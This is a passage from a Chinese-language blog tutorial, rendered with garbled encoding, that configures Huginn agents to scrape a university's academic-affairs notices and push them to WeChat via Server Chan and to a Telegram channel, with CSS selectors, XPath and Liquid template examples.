¼å¼ï¼Œå¯ä»¥å‚è€ƒå³è¾¹çš„æç¤ºæ¥è¿›è¡Œè®¾ç½®ã€‚</p><p>æ€ä¹ˆè¯´å¥½å‘¢ï¼Œå…¶å®ç®€å•çš„å‚æ•°å³è¾¹æ˜¯æœ‰äº†ï¼Œä½†æ˜¯å®é™…é…ç½®çš„æ—¶å€™è¿˜æ˜¯æœ‰ä¸å°‘é—®é¢˜ã€‚çœ‹å®˜æ–¹æ–‡æ¡£å§emmm</p><p><a href="https://huginnio.herokuapp.com/agents">https://huginnio.herokuapp.com/agents</a> è¿™é‡Œæœ‰å…³äºAgentså„è‡ªAPIçš„è¯¦ç»†ä»‹ç»ã€‚</p><hr><p>ä¸‹é¢æ˜¯<code>options</code>çš„å…·ä½“ä»‹ç»ã€‚</p><p>Website Agentå¯ä»¥çˆ¬å–æ¥è‡ª<code>url</code>/<code>url_from_event</code>/<code>data_from_event</code>çš„ä¿¡æ¯ã€‚</p><h4 id="type"><a href="#type" class="headerlink" title="type"></a>type</h4><p>å¯ä»¥<code>xml</code>, <code>html</code>, <code>json</code>, or <code>text</code>ã€‚ç›¸åº”çš„ç±»å‹æœ‰å„è‡ªçš„ä»‹ç»ï¼Œè¿™é‡Œæ˜¯HTMLç½‘é¡µï¼Œå°±ç”¨<code>html</code>å¥½äº†ã€‚</p><h4 id="mode"><a href="#mode" class="headerlink" title="mode"></a>mode</h4><p>å¯ä»¥æ˜¯<code>all</code>, <code>on_change</code>, or <code>merge</code>ã€‚If you specify <code>merge</code> for the <code>mode</code> option, Huginn will retain the old payload and update it with new values. </p><p>å³å¦‚æœé€‰æ‹©<code>merge</code>ï¼Œåˆ™ä¼šä¸ä¹‹å‰çš„ä¿¡æ¯åˆå¹¶ï¼Œè¿™ä¸ªåœ¨è·å–æ•™åŠ¡é€šçŸ¥çš„å…·ä½“å†…å®¹æ—¶ä¼šç”¨åˆ°ï¼Œä¹‹åä¸å†èµ˜è¿°ã€‚è¿™é‡Œåªéœ€è¦åœ¨å‡ºç°æ–°é€šçŸ¥çš„æ—¶å€™è§¦å‘ï¼Œæ‰€ä»¥ç”¨<code>on_change</code>ã€‚</p><h4 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h4><p><code>extract</code>é‡Œå°±æ˜¯è¦è§£æçš„å†…å®¹ï¼Œå¯ä»¥ç”¨a CSS selector in <code>css</code> or an XPath expression in <code>xpath</code>. ï¼ˆå¦‚æœ<code>type</code>é‡Œé€‰<code>text</code>åˆ™å¯ä»¥ç”¨<code>regexp</code>æ­£åˆ™åŒ¹é…ï¼Œ<em>ç„¶è€Œå¦‚æœè¦htmlæå–åå†æ­£åˆ™åŒ¹é…å°±éœ€è¦å†æ¥ä¸€ä¸ªAgentï¼Œæ„Ÿè§‰æœ‰ç‚¹è ¢emmmå¦‚æœæœ‰æ›´å¥½çš„åŠæ³•æ¬¢è¿æ¥å’Œæˆ‘äº¤æµä¸€ä¸‹å“ˆ</em>ï¼‰</p><ul><li><p><strong>è¦æ³¨æ„çš„æ˜¯ï¼š</strong>è¿™ä¸ªè§£æçš„å†…å®¹æ˜¯æ ¹æ®urlæµè§ˆå<strong>ç›´æ¥è·å¾—çš„é¡µé¢ï¼Œæ²¡æœ‰åŠ è½½æ–‡æœ¬ä¹‹å¤–çš„ä»»ä½•å†…å®¹ï¼Œæ²¡æœ‰ç»è¿‡JavaScriptæ¸²æŸ“ç­‰ç­‰</strong>ã€‚æˆ–è€…è¯´å°±æ˜¯ä½ <code>F12</code>åœ¨<code>Network</code>é‡Œçœ‹åˆ°çš„é¡µé¢åŠ è½½å‡ºæ¥çš„documentæˆ–xhrä¹‹ç±»å¾—åˆ°çš„responseã€‚<em>ï¼ˆè¿™ä¸ªæ˜¯åœ¨åˆ©ç”¨ Huginn çˆ¬å–å…¶ä»–ç½‘ç«™çš„æ—¶å€™å‘ç°çš„ï¼‰</em></p></li><li><p>å¦‚æœéœ€è¦çˆ¬å–JavaScriptåŠ è½½çš„ç½‘é¡µï¼Œå¯ä»¥ä½¿ç”¨ <strong>Phantom Js Cloud Agent</strong>ï¼Œè¿™ä¸ªéœ€è¦åœ¨<a href="https://phantomjscloud.com/">PhantomJs Cloud</a>ç”³è¯·ä¸€ä¸ªAPIï¼Œæœ‰ä¸€å®šçš„å…è´¹é¢åº¦ã€‚è¿™ä¸ªAgentä¼šè¿”å›é¡µé¢çš„ç›¸åº”ä¿¡æ¯ï¼Œè¿˜å¯ä»¥å…·ä½“è®¾ç½®è¾“å‡ºJSONã€æˆªå›¾ç­‰ç­‰ã€‚</p></li></ul><p><code>extract</code>é‡Œä»¥JSONæ ¼å¼å†™è¦è§£æçš„å¯¹è±¡ï¼Œåé¢å°±ä¼šè¿”å› ç›¸åº”åå­—ä½œä¸ºKeyï¼Œç›¸åº”çš„å€¼ä½œä¸ºValue çš„JSONç»“æœã€‚</p><p>CSSå¯ä»¥è¿™æ ·æ‰¾â†“ï¼Œç›´æ¥<strong>å¤åˆ¶CSSè·¯å¾„</strong>ï¼Œå†è¿›è¡Œç¼©ç•¥å¤„ç†ã€‚</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/css_selector.png" alt="å¤åˆ¶cssè·¯å¾„"></p><p>æ¯”å¦‚è¿™é‡Œå¤åˆ¶å‡ºæ¥æ˜¯</p><pre class="language-css" data-language="css"><code class="language-css">html body div.container-fluid div.main-content.clearfix div.left-content div.notice-announcement div#index_notice_content.tab-content div.tab-pane.active ul.tab-pane-ul li div.inform-content a</code></pre><p>ç„¶å<strong>å¤„ç† css path</strong>ã€‚</p><p>åŸå§‹è·¯å¾„è¿‡é•¿ï¼Œ<strong>åˆ å»ä¸å¸¦ <code>.</code> æˆ– <code>#</code> çš„èŠ‚ç‚¹ï¼ˆèŠ‚ç‚¹é—´ä»¥ç©ºæ ¼â€œ â€åˆ†å‰²ï¼‰ï¼Œå¹¶åˆ å»æ¯ä¸ªèŠ‚ç‚¹åœ¨ <code>.</code> æˆ– <code>#</code>å‰çš„ç¬¬ä¸€ä¸ªæ ‡ç­¾</strong>ï¼Œå¾—åˆ°ï¼š</p><pre class="language-css" data-language="css"><code class="language-css">.container-fluid .main-content.clearfix .left-content .notice-announcement #index_notice_content.tab-content .tab-pane.active .tab-pane-ul .inform-content a</code></pre><p>å‰åŠéƒ¨åˆ†å¯¹èŠ‚ç‚¹å®šä½ç”¨å¤„ä¸å¤§ï¼Œç»§ç»­ç¼©ç•¥ï¼Œäºæ˜¯å¾—åˆ°</p><pre class="language-css" data-language="css"><code class="language-css">.tab-pane.active .tab-pane-ul .inform-content a</code></pre><blockquote><p><strong>éå¸¸è§„æƒ…å†µå¤„ç†</strong>ï¼š </p><p>a. æœ‰äº›è·¯å¾„ä¸­çš„<strong>èŠ‚ç‚¹å¸¦ç©ºæ ¼</strong>ï¼Œå¦‚<code>&lt;div class="packery-item article"&gt;</code>,è·¯å¾„ä¸­çš„ç©ºæ ¼ç”±<code>.</code>ä»£æ›¿ï¼Œæˆªå–ä¸º<code>.packery-item.article</code> </p><p>b. å½“æŠ“å–<strong>å¤šç§ css path è§„åˆ™</strong>æ—¶ï¼Œç”¨é€—å·<code>,</code>åˆ†å‰²</p><pre class="language-css" data-language="css"><code class="language-css"><span class="token string">"css"</span><span class="token punctuation">:</span> <span class="token string">".focus-title .current a , .stress h2 a"</span><span class="token punctuation">,</span></code></pre><p><code>value</code>ç”¨æ¥æå–æ ‡ç­¾ä¸­çš„å±æ€§ï¼Œå¯ä»¥åˆ©ç”¨<a href="https://www.w3.org/TR/xpath/#section-String-Functions">XPath functions</a>ã€‚ï¼ˆ<a href="https://www.w3school.com.cn/xpath/xpath_functions.asp">ä¸­æ–‡ä»‹ç»</a>ï¼‰</p></blockquote><p>Xpath Functionsæ˜¯å¯ä»¥è¿›è¡ŒåµŒå¥—æ¥ç”¨çš„<del>ï¼ˆå¥—å¨ƒ</del>ï¼ˆx</p><p>è¿™é‡Œç”¨äº† <code>@href</code>æ¥æå–é“¾æ¥ï¼Œç”¨<code>string(.)</code>æ¥æå–è¿™ä¸ªcssè·¯å¾„ä¸‹çš„å­—ç¬¦ä¸²ï¼Œç”¨ <code>normalize-space</code>å‡½æ•°æ¥å»é™¤å¤šä½™çš„ç©ºæ ¼ã€‚å¾—åˆ°çš„JSONè¡¨è¾¾å¼å¦‚ä¸‹ã€‚</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token property">"extract"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"css"</span><span class="token operator">:</span> <span class="token string">".tab-pane.active .tab-pane-ul .inform-content a"</span><span class="token punctuation">,</span>        <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"@href"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"css"</span><span class="token operator">:</span> <span class="token string">".tab-pane.active .tab-pane-ul .inform-content a"</span><span class="token punctuation">,</span>        <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"normalize-space(string(.))"</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="template"><a href="#template" class="headerlink" title="template"></a>template</h4><p>é™¤äº†ä¸Šé¢è¿™äº›ï¼Œè¿˜å¯ä»¥è®¾ç½®<strong>User Agent</strong>ï¼Œä»¥åŠä¸€ä¸ªç”¨**Liquidæ¨¡æ¿è¯­è¨€ç¼–å†™çš„æ¨¡æ¿<code>template</code>**ç­‰ç­‰ã€‚</p><blockquote><p>Liquid markup language. Safe, customer facing template language for flexible web apps.  </p></blockquote><p>Liquidå®˜æ–¹ä»“åº“ï¼š<a href="https://github.com/Shopify/liquid">https://github.com/Shopify/liquid</a>ã€‚è¿™é‡Œæœ‰å…³äºLiquidè¯­æ³•çš„ä¸­æ–‡ä»‹ç»ï¼š<a href="https://liquid.bootcss.com/">https://liquid.bootcss.com/</a>ã€‚</p><p>Liquidä¹Ÿæ˜¯å¯ä»¥åµŒå¥—çš„ï¼Œåˆ©ç”¨ç®¡é“ <code>|</code> å¯ä»¥å°†å¤„ç†åçš„ç»“æœé€åˆ°ä¸‹ä¸€ä¸ªfilterã€‚</p><p>é™¤äº†Liquidè‡ªå¸¦çš„filterï¼ŒHuginnè¿˜æä¾›äº†ä¸€äº›è‡ªå·±çš„ç”¨æ³•ï¼Œè¯¦è§å®˜æ–¹æ–‡æ¡£ <a href="https://github.com/huginn/huginn/wiki/Formatting-Events-using-Liquid">Formatting Events using Liquid</a>ã€‚</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/liquid_huginn.png" alt="Liquid Templating"></p><p>åœ¨è¿™é‡Œï¼Œç”±äºå¾—åˆ°çš„ href æ˜¯ç›¸å¯¹åœ°å€ï¼ˆå¦‚ <code>/2020/0208/c11066a193409/page.htm</code>ï¼‰ï¼Œä¸ºäº†å¾—åˆ°ç»å¯¹åœ°å€ï¼Œåœ¨<code>template</code>ä¸­åˆ©ç”¨ <code> {{ url | to_uri: _response_.url }}</code> è¿›è¡Œå¤„ç†ã€‚</p><p><em>ï¼ˆåˆ«è¯´äº†ï¼Œè¿™å‡ å¤©æ‰¾éäº†XPath functionå’ŒLiquidç”¨æ³•ï¼‰</em></p><hr><p>è®¾å¥½ä¹‹åå¯ä»¥ç‚¹å‡»<strong>Dry Run</strong>æ¥è¯•è¯•ï¼Œçœ‹çœ‹è¿è¡Œçš„ç»“æœï¼Œå†åšè¿›ä¸€æ­¥çš„ä¿®æ”¹ã€‚</p><p>äºæ˜¯æœ€ç»ˆå¾—åˆ°çš„<code>Crawler_AAO #1 Get Notice URLs</code> Options å¦‚ä¸‹ã€‚</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"expected_update_period_in_days"</span><span class="token operator">:</span> <span class="token string">"2"</span><span class="token punctuation">,</span>  <span class="token property">"user_agent"</span><span class="token operator">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0"</span><span class="token punctuation">,</span>  <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"http://aao.nuaa.edu.cn/"</span><span class="token punctuation">,</span>  <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"html"</span><span class="token punctuation">,</span>  <span class="token property">"mode"</span><span class="token operator">:</span> <span class="token string">"on_change"</span><span class="token punctuation">,</span>  <span class="token property">"extract"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"css"</span><span class="token operator">:</span> <span class="token string">".tab-pane.active .tab-pane-ul .inform-content a"</span><span class="token punctuation">,</span>      <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"@href"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"css"</span><span class="token operator">:</span> <span class="token string">".tab-pane.active .tab-pane-ul .inform-content a"</span><span class="token punctuation">,</span>      <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"normalize-space(string(.))"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"time"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"css"</span><span class="token operator">:</span> <span class="token string">".tab-pane.active .tab-pane-ul .inform-data"</span><span class="token punctuation">,</span>      <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"normalize-space(.)"</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token property">"template"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"{{ url | to_uri: _response_.url }}"</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><hr><h3 id="åˆ›å»ºè·å–å†…å®¹çš„-Agent"><a href="#åˆ›å»ºè·å–å†…å®¹çš„-Agent" class="headerlink" title="åˆ›å»ºè·å–å†…å®¹çš„ Agent"></a>åˆ›å»ºè·å–å†…å®¹çš„ Agent</h3><p><strong>Crawler_AAO #2 Get Notice Contents</strong></p><p>ä¸€æ ·æ˜¯Website Agentã€‚</p><p><code>Sources</code>é€‰æ‹©ç¬¬ä¸€æ­¥åˆ›å»ºçš„Agentï¼Œå³ <strong>Crawler_AAO #1 Get Notice URLs</strong>ã€‚</p><p><code>Options</code>ä¸­çš„<code>url</code>å°±æ¥è‡ªç¬¬ä¸€ä¸ªAgentï¼Œäºæ˜¯å¯ä»¥ç”¨Liquidä¸­çš„<code> {{url}} </code>ã€‚</p><p><code>mode</code> ä¸º <code>merge</code>ï¼Œåˆå¹¶ä¹‹å‰çš„ä¿¡æ¯ä½œä¸ºæœ€ç»ˆçš„è¾“å‡ºã€‚å½“ç„¶ä¹Ÿå¯ä»¥åˆ©ç”¨æ¨¡æ¿<code>template</code>ä»¥åŠLiquidæ¥è°ƒç”¨ä¹‹å‰è·å–çš„å¯¹è±¡ã€‚</p><p>è¿™é‡Œå†åˆ©ç”¨Liquidä¸­çš„<code>strip_html</code>ç”¨æ³•ï¼Œå°†æ‰€æœ‰çš„htmlæ ‡ç­¾å»é™¤ï¼Œæœ€ç»ˆå¾—åˆ°çš„<code>content</code>å°±åªå‰©åŒ…å«<code>\n</code>çš„å­—ç¬¦ä¸²äº†ã€‚ï¼ˆä¹‹å‰è¯•äº†XPath Functioné‡Œçš„<code>normalize-space</code>å‡½æ•°ï¼Œå‘ç°æ‰€æœ‰æ–‡å­—éƒ½è¿ä¸€èµ·äº†ï¼Œ<del>ä¸‘æ­»äº†emmm</del></p><p>æœ€ç»ˆå¾—åˆ°å¦‚ä¸‹çš„Optionsã€‚</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"expected_update_period_in_days"</span><span class="token operator">:</span> <span class="token string">"2"</span><span class="token punctuation">,</span>  <span class="token property">"user_agent"</span><span class="token operator">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0"</span><span class="token punctuation">,</span>  <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"{{url}}"</span><span class="token punctuation">,</span>  <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"html"</span><span class="token punctuation">,</span>  <span class="token property">"mode"</span><span class="token operator">:</span> <span class="token string">"merge"</span><span class="token punctuation">,</span>  <span class="token property">"extract"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"css"</span><span class="token operator">:</span> <span class="token string">".wp_articlecontent"</span><span class="token punctuation">,</span>      <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"."</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token property">"template"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"content"</span><span class="token operator">:</span> <span class="token string">"{{ content | strip_html }}"</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><hr><h2 id="å°†é€šçŸ¥æ¨é€åˆ°å¾®ä¿¡"><a href="#å°†é€šçŸ¥æ¨é€åˆ°å¾®ä¿¡" class="headerlink" title="å°†é€šçŸ¥æ¨é€åˆ°å¾®ä¿¡"></a>å°†é€šçŸ¥æ¨é€åˆ°å¾®ä¿¡</h2><p><strong>Crawler_AAO #3 WeChat Push</strong></p><p>è¿™é‡Œåˆ©ç”¨Server Chanæä¾›çš„å¾®ä¿¡æ¨¡æ¿æ¶ˆæ¯æ¨é€æœåŠ¡ï¼Œä¹‹å‰ä¹Ÿå†™è¿‡ä¸€ç¯‡ï¼š<a href="https://miaotony.xyz/2019/03/07/Idea_PushBearAPI_WeChatPush/">å°æƒ³æ³• | åŸºäºPushBear APIå®ç°å¾®ä¿¡æ¶ˆæ¯æ¨é€</a>ã€‚è¿™æ¬¡å†æ¥ç”¨ä¸€ä¸‹å‘¢ã€‚</p><p>ç°åœ¨ PushBear ä¸€å¯¹å¤šçš„æ¨é€éœ€è¦ç»‘å®šè®¤è¯è¿‡çš„æœåŠ¡å·äº†ï¼Œä½†æ˜¯ä¸ªäººçš„æ¨é€è¿˜æ˜¯å¯ä»¥ç”¨çš„ã€‚</p><p>è¿™æ¬¡ç”¨çš„å°±æ˜¯Huginné‡Œçš„<strong>Post Agent</strong>å•¦ã€‚</p><h3 id="method"><a href="#method" class="headerlink" title="method"></a>method</h3><p>è¿™ä¸ªAgentçš„<code>method</code>å¯ä»¥æ˜¯<code>get</code>, <code>post</code>, <code>put</code>, <code>patch</code>, and <code>delete</code>ï¼ŒåŸºæœ¬çš„éƒ½èƒ½å®ç°ã€‚</p><p>Server Chané‚£è¾¹è¯´æ˜¯ç”¨GETï¼Œä½†å¥½åƒPOSTä¹Ÿè¡Œã€‚</p><h3 id="post-url"><a href="#post-url" class="headerlink" title="post_url"></a>post_url</h3><p>å¡«å†™Server Chançš„APIåœ°å€ï¼Œ<code> https://sc.ftqq.com/{% credential YourServerChanAPI %}.send?  </code></p><p>è¿™é‡ŒæŠŠAPIä¿å­˜åˆ°äº†Credentialsé‡Œï¼Œç›´æ¥ç”¨Liquidæ¨¡æ¿è°ƒç”¨å°±å¥½äº†ã€‚</p><h3 id="content-type"><a href="#content-type" class="headerlink" title="content_type"></a>content_type</h3><p>è¿™é‡Œç”¨formï¼ˆ<code>application/x-www-form-urlencoded</code>ï¼‰ã€‚</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>APIæ¥å£æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œæ ‡é¢˜<code>text</code>ï¼ˆå¿…é¡»ï¼‰ï¼Œæè¿°<code>desp</code>ï¼ˆå¯é€‰ï¼‰ï¼Œæ”¯æŒMarkdownè¯­æ³•ã€‚</p><p>è¿™é‡Œè‡ªå·±å®šä¹‰å°±å¥½äº†å•¦~ æ€ä¹ˆå¼€å¿ƒæ€ä¹ˆæ¥å˜»å˜»å˜»ã€‚</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token property">"payload"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"ã€{{title}}ã€‘"</span><span class="token punctuation">,</span>    <span class="token property">"desp"</span><span class="token operator">:</span> <span class="token string">"{{ url }}{% line_break %}{% line_break %}{{ content | replace: \"\n\", \"\n\n\" }}"</span><span class="token punctuation">}</span></code></pre><p><strong>è¦æ³¨æ„çš„æ˜¯ï¼š</strong>å¦‚æœç›´æ¥åœ¨å®ƒçš„æ¨¡æ¿é‡Œä¿®æ”¹å‚æ•°ä¿¡æ¯ï¼Œåˆ™**å¸¦æœ‰<code>\</code>çš„ä¼šè‡ªåŠ¨è½¬ä¹‰ä¸º<code>\\</code>**ï¼</p><p>å› æ­¤ç›´æ¥å†™<code>\n</code>ä¸å¯è¡Œï¼Œè€Œè¦ç‚¹å‡»<strong>Toggle View</strong>ç„¶åç›´æ¥å†™<code>\n</code>ã€‚æˆ–è€…ä¹Ÿå¯ä»¥è°ƒç”¨ Huginn æä¾›çš„æ–¹æ³• <code> {% line_break %} </code> ã€‚</p><p>å¦ä¸€ä¸ªé—®é¢˜ï¼Œ<strong>åœ¨Server Chanä¸­<code>\n\n</code>æ‰èƒ½æ¢è¡Œ</strong>ï¼Œäºæ˜¯åˆ©ç”¨ Liquid çš„<code>  {{ content | replace: \"\n\", \"\n\n\" }} </code> æŠŠ<code>\n</code>ç»™æ›¿æ¢æˆ<code>\n\n</code>ã€‚ï¼ˆéœ€è¦ç›´æ¥å†™ï¼Œä¸èƒ½ç›´æ¥åœ¨å‚æ•°çš„æ¡†é‡Œæ”¹ã€‚</p><p>è¿˜è¦æ³¨æ„ä¿å­˜åå¦‚æœå†æ¬¡ä¿®æ”¹åˆ™<code>\n</code>åˆä¼šè‡ªåŠ¨å˜ä¸º<code>\\n</code>ï¼Œæ³¨æ„ç•™æ„ã€‚å»ºè®®ä¿å­˜ä¹‹å‰å…ˆ<strong>Dry Run</strong>è¯•è¯•ã€‚</p><h3 id="emit-events"><a href="#emit-events" class="headerlink" title="emit_events"></a>emit_events</h3><p>å¦‚æœè®¾ä¸º<code>true</code>ï¼Œåˆ™ä¼šè¿”å›ä¸€ä¸ªEventï¼Œå¯ä»¥å†åŠ ä¸€ä¸ªAgentæ¥åˆ¤æ–­æ˜¯å¦å‘é€æˆåŠŸã€‚</p><p>ä¾‹å¦‚æŸæ¬¡å‘é€æˆåŠŸåå¾—åˆ°çš„Eventå¦‚ä¸‹ï¼Œå…¶ä¸­çš„bodyéƒ¨åˆ†ä¸ºè¿”å›çš„æ•°æ®ã€‚</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"body"</span><span class="token operator">:</span> <span class="token string">"{\"errno\":0,\"errmsg\":\"success\",\"dataset\":\"done\"}"</span><span class="token punctuation">,</span>  <span class="token property">"status"</span><span class="token operator">:</span> <span class="token number">200</span><span class="token punctuation">,</span>  <span class="token property">"headers"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"Server"</span><span class="token operator">:</span> <span class="token string">"nginx"</span><span class="token punctuation">,</span>    <span class="token property">"Date"</span><span class="token operator">:</span> <span class="token string">"Tue, 10 Feb 2020 09:00:51 GMT"</span><span class="token punctuation">,</span>    <span class="token property">"Content-Type"</span><span class="token operator">:</span> <span class="token string">"text/html;charset=utf-8"</span><span class="token punctuation">,</span>    <span class="token property">"Transfer-Encoding"</span><span class="token operator">:</span> <span class="token string">"chunked"</span><span class="token punctuation">,</span>    <span class="token property">"Connection"</span><span class="token operator">:</span> <span class="token string">"keep-alive"</span><span class="token punctuation">,</span>    <span class="token property">"Expires"</span><span class="token operator">:</span> <span class="token string">"Thu, 01 Jan 1970 00:00:01 GMT"</span><span class="token punctuation">,</span>    <span class="token property">"Cache-Control"</span><span class="token operator">:</span> <span class="token string">"no-cache, must-revalidate"</span><span class="token punctuation">,</span>    <span class="token property">"Pragma"</span><span class="token operator">:</span> <span class="token string">"no-cache"</span><span class="token punctuation">,</span>    <span class="token property">"Via"</span><span class="token operator">:</span> <span class="token string">"100167"</span><span class="token punctuation">,</span>    <span class="token property">"Set-Cookie"</span><span class="token operator">:</span> <span class="token string">"PHPSESSID=xxxxxxxxxx; expires=Wed, 11-Feb-2020 09:00:51 GMT; path=/; domain=sc.ftqq.com; HttpOnly"</span><span class="token punctuation">,</span>    <span class="token property">"Content-Length"</span><span class="token operator">:</span> <span class="token number">47</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><hr><h2 id="å°†é€šçŸ¥æ¨é€åˆ°Telegram-Channel"><a href="#å°†é€šçŸ¥æ¨é€åˆ°Telegram-Channel" class="headerlink" title="å°†é€šçŸ¥æ¨é€åˆ°Telegram Channel"></a>å°†é€šçŸ¥æ¨é€åˆ°Telegram Channel</h2><p><strong>Crawler_AAO #3 Telegram Channel Push</strong></p><p>åŒæ ·ä½¿ç”¨çš„æ˜¯<strong>Post Agent</strong>ã€‚<em>ï¼ˆçœ‹äº†ä¸€ä¸‹ï¼ŒTelegram Agentå¥½åƒä¸å¤§çµæ´»ï¼Œè€Œä¸”è¿˜éœ€è¦å…ˆæœ‰ä¸€ä¸ªEvent Formatting Agentï¼Œè®©Eventä¸­åŒ…å«either a <code>text</code>, <code>photo</code>, <code>audio</code>, <code>document</code> or <code>video</code> key.ï¼‰</em></p><p>æ˜¨å¤©ç ”ç©¶äº†å¥½ä¹…Telegram Botï¼Œçœ‹äº†çœ‹<a href="https://core.telegram.org/bots/api">å®˜æ–¹APIæ–‡æ¡£</a>ï¼Œå‘ç°æ²¡æœ‰æƒ³è±¡ä¸­çš„é‚£ä¹ˆå›°éš¾233333ã€‚</p><p>é¦–å…ˆ @BotFather æ³¨å†Œä¸€ä¸ªTGBotï¼Œå¾—åˆ°tokenã€‚</p><p>è¿™é‡Œæ²¡æœ‰è®¾ç½®Webhookï¼Œåªéœ€è¦ç”¨åˆ°<code>sendMessage</code>æ–¹æ³•å°±å¥½äº†ã€‚</p><h3 id="post-url-1"><a href="#post-url-1" class="headerlink" title="post_url"></a>post_url</h3><p>URLä¸º<code>https://api.telegram.org/bot&lt;token&gt;/sendMessage</code>ï¼Œå°†<code>&lt;token&gt;</code>éƒ¨åˆ†æ¢æˆè‡ªå·±çš„Bot tokenï¼Œå¯ä»¥ä¿å­˜åˆ°Credentialsé‡Œã€‚</p><p>å¦‚<code>https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/sendMessage</code></p><p>å¯ä»¥å…ˆç”¨ PostMan æµ‹è¯•ä¸€ä¸‹ã€‚</p><p>åˆ«å¿˜äº†<code>bot</code>â€¦â€¦<em>ï¼ˆæ˜¯æˆ‘äº†</em></p><h3 id="method-1"><a href="#method-1" class="headerlink" title="method"></a>method</h3><p>POST or GET</p><h3 id="content-type-1"><a href="#content-type-1" class="headerlink" title="content_type"></a>content_type</h3><ul><li><a href="https://en.wikipedia.org/wiki/Query_string">URL query string</a></li><li>application/x-www-form-urlencoded</li><li>application/json (except for uploading files)</li><li>multipart/form-data (use to upload files)</li></ul><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><p>å‚æ•°åˆ—è¡¨å¦‚ä¸‹</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/TGAPI.png" alt="APIå‚æ•°"></p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨Markdownè¯­æ³•ã€‚ï¼ˆè¿˜åˆ«è¯´ï¼ŒçœŸæŒºå¥½</p><hr><p>å…¶å®è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘éƒ¨ç½²Huginnçš„æœåŠ¡å™¨æ˜¯åœ¨å¢™å†…çš„ï¼Œäºæ˜¯è¿˜éœ€è¦æƒ³åŠæ³•è½¬å‘å‡ºå»ã€‚</p><p>å…·ä½“è‡ªå·±æƒ³åŠæ³•äº†å•¦ã€‚</p><p><del>ï¼ˆæŠ˜è…¾äº†åŠå¤©ç”¨ <em>heroku</em> æ­äº†ä¸€ä¸ªè‡ªå·±å‡‘åˆç€ç”¨</del></p><hr><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å…¶å®æœ€åˆæ˜¯æƒ³çœ‹çœ‹Huginnæ€ä¹ˆç”¨çš„ï¼ŒæŠ˜è…¾è¿‡ç¨‹ä¸­è¿˜å»çœ‹äº†Liquidæ¨¡æ¿è¯­æ³•ï¼ŒXPath Functionsç”¨æ³•ã€‚</p><p>æ¨é€åˆ°å¾®ä¿¡çš„å‰å‡ å¤©å°±å¼„å¥½äº†ï¼Œæ˜¨å¤©æƒ³çœ‹çœ‹TG Botæ€ä¹ˆç©ï¼Œäºæ˜¯ç ”ç©¶äº†ä¸€ä¸‹Bot APIï¼Œé¡ºä¾¿åˆå†™äº†ä¸ªæ¨é€åˆ°TG Channelçš„ã€‚</p><p><strong>æœ€ç»ˆçš„æ•ˆæœâ€”â€”</strong></p><p>æ¯éš”ä¸€æ®µæ—¶é—´ï¼ŒHuginn 